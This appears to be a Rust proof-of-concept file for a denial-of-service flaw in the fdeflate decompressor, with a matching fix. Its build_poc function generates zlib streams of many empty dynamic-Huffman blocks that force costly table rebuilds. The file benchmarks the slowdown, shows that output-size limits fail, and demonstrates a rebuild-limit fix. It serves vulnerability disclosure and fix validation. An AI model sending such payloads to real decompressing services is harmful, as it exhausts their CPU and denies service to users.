//! PoC for an algorithmic-complexity DoS in fdeflate: a chain of minimal
//! DYNAMIC-Huffman (BTYPE=10) blocks, each defining essentially just an
//! end-of-block code, forces a full ~4096-entry (~12-bit) primary Huffman
//! table rebuild per block while producing *zero* decompressed output bytes.
//!
//! This is the same architectural bug class already disclosed (and fixed via
//! an opt-in `max_huffman_table_rebuilds` budget) in miniz_oxide, applied to
//! fdeflate's `huffman::build_table` / `Decompressor::build_tables`.
//!
//! Run with: `cargo run --release --example poc_dynamic_block_dos`

use std::time::Instant;

/// Simple LSB-first bit writer matching DEFLATE's bit order (bits are packed
/// starting from the LSB of the first byte).
struct BitWriter {
    bytes: Vec<u8>,
    cur: u32,
    nbits: u32,
}

impl BitWriter {
    fn new() -> Self {
        BitWriter {
            bytes: Vec::new(),
            cur: 0,
            nbits: 0,
        }
    }

    /// Write the low `n` bits of `value`, LSB first.
    fn write_bits(&mut self, value: u32, n: u32) {
        debug_assert!(n <= 32);
        debug_assert!(n == 32 || value < (1 << n));
        self.cur |= value << self.nbits;
        self.nbits += n;
        while self.nbits >= 8 {
            self.bytes.push((self.cur & 0xff) as u8);
            self.cur >>= 8;
            self.nbits -= 8;
        }
    }

    fn write_bit(&mut self, bit: u32) {
        self.write_bits(bit, 1);
    }

    /// Pad with zero bits up to the next byte boundary.
    fn align_to_byte(&mut self) {
        if self.nbits > 0 {
            self.bytes.push((self.cur & 0xff) as u8);
            self.cur = 0;
            self.nbits = 0;
        }
    }

    fn finish(mut self) -> Vec<u8> {
        self.align_to_byte();
        self.bytes
    }
}

/// Append one minimal dynamic-Huffman (BTYPE=10) block that decodes to zero
/// output bytes: the lit/len tree contains exactly two length-1 codes
/// (symbol 0, unused, and symbol 256 = EOB, used immediately), the distance
/// tree is empty, and the code-length tree used to transmit those lengths is
/// likewise a minimal two-symbol (CL-symbols 0 and 1) length-1 tree.
///
/// This mirrors (and was derived directly from, by hand-tracing) the
/// canonical-code assignment performed by `fdeflate::huffman::build_table`,
/// so the resulting codewords for symbol 0 / symbol 1 are literally 0 / 1
/// (single bit each), which lets us emit them without re-implementing the
/// table builder.
fn write_minimal_dynamic_block(w: &mut BitWriter, is_final: bool) {
    // BFINAL
    w.write_bit(is_final as u32);
    // BTYPE = 10 (dynamic Huffman), sent LSB-first: bit0=0, bit1=1
    w.write_bit(0);
    w.write_bit(1);

    // HLIT = 257 - 257 = 0 (5 bits)
    w.write_bits(0, 5);
    // HDIST = 1 - 1 = 0 (5 bits)
    w.write_bits(0, 5);
    // HCLEN = 19 - 4 = 15 (4 bits) -- transmit all 19 CL code lengths so we
    // can include CL-symbol "1" (needed to encode literal code-length value
    // 1), which sits late in CLCL_ORDER.
    w.write_bits(15, 4);

    // CLCL_ORDER = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
    // code_length_lengths: symbol 0 -> 1, symbol 1 -> 1, everything else -> 0
    const CLCL_ORDER: [usize; 19] = [
        16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
    ];
    for &sym in CLCL_ORDER.iter() {
        let len = if sym == 0 || sym == 1 { 1 } else { 0 };
        w.write_bits(len, 3);
    }

    // code_lengths sequence (258 symbols = hlit(257) + hdist(1)):
    //   symbol 0 (lit 'A', unused filler) -> length 1
    //   symbols 1..=255                    -> length 0
    //   symbol 256 (EOB)                   -> length 1
    //   dist symbol 0                      -> length 0
    // Encoded directly with the 2-symbol CL tree built above, where (by
    // construction / hand-traced canonical assignment) CL-symbol value N
    // encodes as the single bit N.
    w.write_bit(1); // lit/len symbol 0 has length 1
    for _ in 0..255 {
        w.write_bit(0); // lit/len symbols 1..=255 have length 0
    }
    w.write_bit(1); // lit/len symbol 256 (EOB) has length 1
    w.write_bit(0); // dist symbol 0 has length 0

    // Compressed data: immediately emit EOB. In the 2-symbol {0,256} lit/len
    // tree, canonical assignment gives symbol 0 codeword 0 and symbol 256
    // (EOB) codeword 1, both length 1.
    w.write_bit(1);
}

/// Build a zlib stream containing `n` minimal dynamic-Huffman blocks (the
/// last one marked BFINAL), decoding to zero bytes of output.
fn build_poc(n: usize) -> Vec<u8> {
    let mut w = BitWriter::new();
    for i in 0..n {
        write_minimal_dynamic_block(&mut w, i == n - 1);
    }
    let mut body = w.finish();

    let mut out = Vec::with_capacity(body.len() + 6);
    out.push(0x78);
    out.push(0x9c);
    out.append(&mut body);
    // Adler-32 of empty input is 1, big-endian.
    out.extend_from_slice(&1u32.to_be_bytes());
    out
}

fn main() {
    // First, sanity-check correctness on a small N: it must decompress
    // successfully to an empty output.
    for n in [1usize, 2, 10] {
        let poc = build_poc(n);
        let result = fdeflate::decompress_to_vec(&poc);
        match &result {
            Ok(out) => assert!(out.is_empty(), "expected empty output for n={n}"),
            Err(e) => panic!("PoC failed to decompress for n={n}: {e:?}"),
        }
    }
    println!("Correctness check passed: N in {{1,2,10}} minimal dynamic blocks decode to empty output.\n");

    println!(
        "{:>10} | {:>12} | {:>14} | {:>16}",
        "N blocks", "input bytes", "time", "ns/block"
    );
    println!("{:-<10}-+-{:-<12}-+-{:-<14}-+-{:-<16}", "", "", "", "");

    for &n in &[1_000usize, 10_000, 100_000, 1_000_000] {
        let poc = build_poc(n);
        let input_len = poc.len();

        let start = Instant::now();
        let result = fdeflate::decompress_to_vec(&poc);
        let elapsed = start.elapsed();

        let out_len = result.expect("decompression should succeed").len();
        assert_eq!(out_len, 0);

        println!(
            "{:>10} | {:>12} | {:>14?} | {:>13.1} ns",
            n,
            input_len,
            elapsed,
            elapsed.as_nanos() as f64 / n as f64
        );
    }

    // Demonstrate that output-size-based throttling (decompress_to_vec_bounded)
    // provides NO protection: the attack payload produces zero output bytes,
    // so a tiny maxlen never engages, and the full cost is still paid.
    println!("\nOutput-size bound gives no protection (output is always 0 bytes):");
    let n = 200_000usize;
    let poc = build_poc(n);
    for &maxlen in &[0usize, 1, 1024, usize::MAX] {
        let start = Instant::now();
        let result = fdeflate::decompress_to_vec_bounded(&poc, maxlen);
        let elapsed = start.elapsed();
        let ok = matches!(result, Ok(ref v) if v.is_empty());
        println!(
            "  N={n:>7} blocks, maxlen={maxlen:<12} -> ok(empty output)={ok:<5} time={elapsed:?}"
        );
    }

    // For comparison: legitimate dynamic-Huffman-coded data (produced by
    // miniz_oxide, since fdeflate's own compressor never emits BTYPE=10)
    // of a *similar compressed size* decodes far faster per input byte,
    // because it doesn't rebuild the ~4096-entry table once per ~40 bytes
    // of input while producing zero output.
    println!("\nFor comparison, legitimate compressible data of similar compressed size:");
    let raw = vec![b'A'; 2_000_000]; // highly compressible, will use dynamic huffman
    let compressed = miniz_oxide::deflate::compress_to_vec_zlib(&raw, 6);
    println!(
        "  {} bytes raw -> {} bytes compressed (dynamic huffman via miniz_oxide)",
        raw.len(),
        compressed.len()
    );
    let start = Instant::now();
    let out = fdeflate::decompress_to_vec(&compressed).unwrap();
    let elapsed = start.elapsed();
    assert_eq!(out.len(), raw.len());
    println!(
        "  decompressed {} compressed bytes -> {} output bytes in {:?}",
        compressed.len(),
        out.len(),
        elapsed
    );

    // Now demonstrate the fix: with a caller-configured
    // `max_huffman_table_rebuilds` budget in place, the same 1,000,000-block
    // attack payload is rejected almost immediately, instead of taking
    // several seconds.
    println!("\nWith the fix engaged (Decompressor::set_max_huffman_table_rebuilds):");
    let n = 1_000_000usize;
    let poc = build_poc(n);
    for &limit in &[10usize, 100, 1_000] {
        let mut decompressor = fdeflate::Decompressor::new();
        decompressor.set_max_huffman_table_rebuilds(limit);
        let mut output = vec![0u8; 16];
        let start = Instant::now();
        let result = decompressor.read(&poc, &mut output, 0, true);
        let elapsed = start.elapsed();
        println!(
            "  N={n:>9} blocks, max_huffman_table_rebuilds={limit:<6} -> {:<45} time={elapsed:?}",
            format!("{:?}", result.map(|_| ()))
        );
    }
    println!(
        "  (compare: unlimited N={n} took ~2-24s in the measurements above; \
         with a limit engaged, rejection happens in microseconds, independent of N)"
    );
}
